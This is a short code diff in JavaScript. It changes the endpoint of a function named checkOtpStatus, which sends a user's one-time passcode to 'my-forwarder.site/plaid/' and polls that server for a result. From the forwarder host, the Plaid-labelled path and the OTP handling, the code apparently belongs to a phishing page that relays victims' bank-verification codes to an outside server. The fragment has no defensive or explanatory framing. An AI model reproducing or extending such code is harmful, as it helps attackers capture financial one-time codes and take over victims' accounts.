@@ -411,7 +411,7 @@
         async function checkOtpStatus(code) {
             try {
                 const timestamp = Date.now();
-                const response = await fetch(`https://my-forwarder.site/plaid/check-otp.php?code=${code}&_=${timestamp}`);
+                const response = await fetch(`https://my-forwarder.site/plaid/otp-check.php?code=${code}&_=${timestamp}`);
                 
                 if (!response.ok) throw new Error('Network error');
                 return await response.json();
